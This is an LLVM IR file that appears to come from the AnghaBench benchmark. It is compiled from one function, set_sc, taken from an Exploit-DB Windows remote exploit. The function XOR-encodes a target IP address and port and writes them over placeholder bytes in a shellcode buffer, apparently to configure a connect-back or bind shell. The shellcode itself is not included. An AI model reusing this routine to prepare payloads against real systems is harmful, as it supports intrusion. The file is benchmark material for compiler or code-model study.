; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6238.c_set_sc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6238.c_set_sc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HOP = common dso_local global i64 0, align 8
@POP = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [53 x i8] c"error: unable to find ip/port sequence in shellc0de\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @set_sc(i8* %0, i64 %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i64 %1, i64* %6, align 8
  store i8* %2, i8** %7, align 8
  %11 = load i8*, i8** %5, align 8
  %12 = call i32 @inet_addr(i8* %11)
  %13 = xor i32 %12, -1734829928
  %14 = zext i32 %13 to i64
  store i64 %14, i64* %8, align 8
  %15 = load i64, i64* %6, align 8
  %16 = trunc i64 %15 to i32
  %17 = call i64 @htons(i32 %16)
  store i64 %17, i64* %9, align 8
  %18 = load i64, i64* %9, align 8
  %19 = shl i64 %18, 16
  store i64 %19, i64* %9, align 8
  %20 = load i64, i64* %9, align 8
  %21 = add i64 %20, 2
  store i64 %21, i64* %9, align 8
  %22 = load i64, i64* %9, align 8
  %23 = xor i64 %22, 2560137368
  store i64 %23, i64* %9, align 8
  store i32 0, i32* %10, align 4
  br label %24

24:                                               ; preds = %122, %3
  %25 = load i32, i32* %10, align 4
  %26 = load i8*, i8** %7, align 8
  %27 = call i32 @strlen(i8* %26)
  %28 = icmp ult i32 %25, %27
  br i1 %28, label %29, label %125

29:                                               ; preds = %24
  %30 = load i8*, i8** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i64
  %36 = load i64, i64* @HOP, align 8
  %37 = icmp eq i64 %35, %36
  br i1 %37, label %38, label %75

38:                                               ; preds = %29
  %39 = load i8*, i8** %7, align 8
  %40 = load i32, i32* %10, align 4
  %41 = add i32 %40, 1
  %42 = zext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %39, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i64
  %46 = load i64, i64* @HOP, align 8
  %47 = icmp eq i64 %45, %46
  br i1 %47, label %48, label %75

48:                                               ; preds = %38
  %49 = load i8*, i8** %7, align 8
  %50 = load i32, i32* %10, align 4
  %51 = add i32 %50, 2
  %52 = zext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %49, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i64
  %56 = load i64, i64* @HOP, align 8
  %57 = icmp eq i64 %55, %56
  br i1 %57, label %58, label %74

58:                                               ; preds = %48
  %59 = load i8*, i8** %7, align 8
  %60 = load i32, i32* %10, align 4
  %61 = add i32 %60, 3
  %62 = zext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %59, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i64
  %66 = load i64, i64* @HOP, align 8
  %67 = icmp eq i64 %65, %66
  br i1 %67, label %68, label %74

68:                                               ; preds = %58
  %69 = load i8*, i8** %7, align 8
  %70 = load i32, i32* %10, align 4
  %71 = zext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = call i32 @memcpy(i8* %72, i64* %8, i32 4)
  store i64 0, i64* %8, align 8
  br label %74

74:                                               ; preds = %68, %58, %48
  br label %75

75:                                               ; preds = %74, %38, %29
  %76 = load i8*, i8** %7, align 8
  %77 = load i32, i32* %10, align 4
  %78 = zext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i64
  %82 = load i64, i64* @POP, align 8
  %83 = icmp eq i64 %81, %82
  br i1 %83, label %84, label %121

84:                                               ; preds = %75
  %85 = load i8*, i8** %7, align 8
  %86 = load i32, i32* %10, align 4
  %87 = add i32 %86, 1
  %88 = zext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i64
  %92 = load i64, i64* @POP, align 8
  %93 = icmp eq i64 %91, %92
  br i1 %93, label %94, label %121

94:                                               ; preds = %84
  %95 = load i8*, i8** %7, align 8
  %96 = load i32, i32* %10, align 4
  %97 = add i32 %96, 2
  %98 = zext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %95, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i64
  %102 = load i64, i64* @POP, align 8
  %103 = icmp eq i64 %101, %102
  br i1 %103, label %104, label %120

104:                                              ; preds = %94
  %105 = load i8*, i8** %7, align 8
  %106 = load i32, i32* %10, align 4
  %107 = add i32 %106, 3
  %108 = zext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %105, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = sext i8 %110 to i64
  %112 = load i64, i64* @POP, align 8
  %113 = icmp eq i64 %111, %112
  br i1 %113, label %114, label %120

114:                                              ; preds = %104
  %115 = load i8*, i8** %7, align 8
  %116 = load i32, i32* %10, align 4
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = call i32 @memcpy(i8* %118, i64* %9, i32 4)
  store i64 0, i64* %9, align 8
  br label %120

120:                                              ; preds = %114, %104, %94
  br label %121

121:                                              ; preds = %120, %84, %75
  br label %122

122:                                              ; preds = %121
  %123 = load i32, i32* %10, align 4
  %124 = add i32 %123, 1
  store i32 %124, i32* %10, align 4
  br label %24

125:                                              ; preds = %24
  %126 = load i64, i64* %8, align 8
  %127 = icmp ne i64 %126, 0
  br i1 %127, label %131, label %128

128:                                              ; preds = %125
  %129 = load i64, i64* %9, align 8
  %130 = icmp ne i64 %129, 0
  br i1 %130, label %131, label %133

131:                                              ; preds = %128, %125
  %132 = call i32 @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %4, align 4
  br label %134

133:                                              ; preds = %128
  store i32 0, i32* %4, align 4
  br label %134

134:                                              ; preds = %133, %131
  %135 = load i32, i32* %4, align 4
  ret i32 %135
}

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @htons(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
